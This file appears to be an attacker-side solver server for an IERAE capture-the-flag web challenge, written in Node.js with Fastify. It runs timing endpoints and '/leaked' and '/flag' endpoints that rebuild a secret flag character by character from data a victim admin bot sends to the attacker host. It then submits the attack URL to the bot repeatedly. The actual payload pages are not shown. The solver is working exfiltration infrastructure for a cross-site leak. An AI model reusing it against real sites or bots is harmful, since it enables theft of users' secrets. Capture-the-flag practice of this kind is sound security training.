const app = require("fastify")();
const path = require("node:path");

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";

const PORT = "8080";
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? `http://host.docker.internal:${PORT}`;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  app.register(require("@fastify/static"), {
    root: path.join(__dirname, "public"),
  });

  let startTime;
  let endTime;

  app.get("/start-time", async (req, reply) => {
    startTime = performance.now();
    return "";
  });

  app.get("/end-time", async (req, reply) => {
    endTime = performance.now();
    return "";
  });

  app.get("/get-time", async (req, reply) => {
    while (true) {
      if (startTime && endTime && startTime < endTime) {
        const time = endTime - startTime;
        return { time };
      }
      await sleep(5);
    }
  });

  app.post("/debug", async (req, reply) => {
    console.debug("DEBUG:", req.body.trim());
    return "";
  });

  let known = "IERAE{";

  app.post("/leaked", async (req, reply) => {
    known = req.body.trim();
    console.log(known);
    return "";
  });

  app.post("/flag", async (req, reply) => {
    // You got a flag!
    console.log("Flag:", req.body);
    process.exit(0);
  });

  app.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) {
      console.error(err);
      process.exit(1);
    }

    await sleep(3 * 1000);
    for (let i = 0; i < 5; i++) {
      console.log(`Report ${i + 1}:`);
      await reportUrl(
        `${ATTACKER_BASE_URL}?${new URLSearchParams({
          baseUrl: "http://web:3000",
          known,
        })}`
      );
    }

    console.error("Failed");
    process.exit(1);
  });
};
start();
